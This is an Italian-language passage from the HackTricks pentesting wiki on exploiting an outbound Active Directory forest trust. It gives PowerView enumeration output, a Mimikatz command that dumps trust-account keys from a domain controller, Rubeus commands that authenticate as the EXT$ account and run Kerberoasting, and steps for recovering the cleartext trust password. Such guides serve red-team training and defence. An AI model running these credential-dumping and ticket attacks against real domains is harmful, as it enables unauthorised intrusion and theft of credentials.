# Dominio Forestale Esterno - One-Way (In uscita)

<details>

<summary><strong>Impara l'hacking AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se desideri vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**Gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

In questo scenario **il tuo dominio** sta **affidando** alcuni **privilegi** a un principale proveniente da **domini diversi**.

## Enumerazione

### Trust in uscita
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Attacco all'account di fiducia

Esiste una vulnerabilità di sicurezza quando viene stabilito un rapporto di fiducia tra due domini, identificati qui come dominio **A** e dominio **B**, dove il dominio **B** estende la sua fiducia al dominio **A**. In questa configurazione, viene creato un account speciale nel dominio **A** per il dominio **B**, che svolge un ruolo cruciale nel processo di autenticazione tra i due domini. Questo account, associato al dominio **B**, viene utilizzato per crittografare i ticket per accedere ai servizi tra i domini.

L'aspetto critico da comprendere qui è che la password e l'hash di questo account speciale possono essere estratti da un Domain Controller nel dominio **A** utilizzando uno strumento a riga di comando. Il comando per eseguire questa azione è:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Questa estrazione è possibile perché l'account, identificato con un **$** dopo il suo nome, è attivo e appartiene al gruppo "Domain Users" del dominio **A**, ereditando così le autorizzazioni associate a questo gruppo. Ciò consente alle persone di autenticarsi contro il dominio **A** utilizzando le credenziali di questo account.

**Avviso:** È fattibile sfruttare questa situazione per ottenere un punto d'appoggio nel dominio **A** come utente, sebbene con autorizzazioni limitate. Tuttavia, questo accesso è sufficiente per eseguire un'enumerazione sul dominio **A**.

In uno scenario in cui `ext.local` è il dominio fiduciario e `root.local` è il dominio di fiducia, verrebbe creato un account utente chiamato `EXT$` all'interno di `root.local`. Attraverso strumenti specifici, è possibile estrarre le chiavi di trust Kerberos, rivelando le credenziali di `EXT$` in `root.local`. Il comando per ottenere ciò è:
```bash
lsadump::trust /patch
```
Seguendo questo, si potrebbe utilizzare la chiave RC4 estratta per autenticarsi come `root.local\EXT$` all'interno di `root.local` utilizzando un altro comando dello strumento:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Questo passaggio di autenticazione apre la possibilità di enumerare e persino sfruttare i servizi all'interno di `root.local`, come ad esempio eseguire un attacco Kerberoast per estrarre le credenziali dell'account di servizio utilizzando:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Recupero della password di trust in testo normale

Nel flusso precedente è stato utilizzato l'hash di trust invece della **password in chiaro** (che è stata anche **estratta da mimikatz**).

La password in chiaro può essere ottenuta convertendo l'output \[ CLEAR ] da mimikatz da esadecimale e rimuovendo i byte null '\x00':

![](<../../.gitbook/assets/image (938).png>)

A volte, quando si crea una relazione di trust, l'utente deve digitare una password per il trust. In questa dimostrazione, la chiave è la password di trust originale e quindi leggibile dall'essere umano. Poiché la chiave cambia (ogni 30 giorni), la password in chiaro non sarà leggibile dall'essere umano ma tecnicamente ancora utilizzabile.

La password in chiaro può essere utilizzata per eseguire l'autenticazione regolare come account di trust, un'alternativa alla richiesta di un TGT utilizzando la chiave segreta Kerberos dell'account di trust. Qui, interrogando root.local da ext.local per i membri di Domain Admins:

![](<../../.gitbook/assets/image (792).png>)

## Riferimenti

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><strong>Impara l'hacking su AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
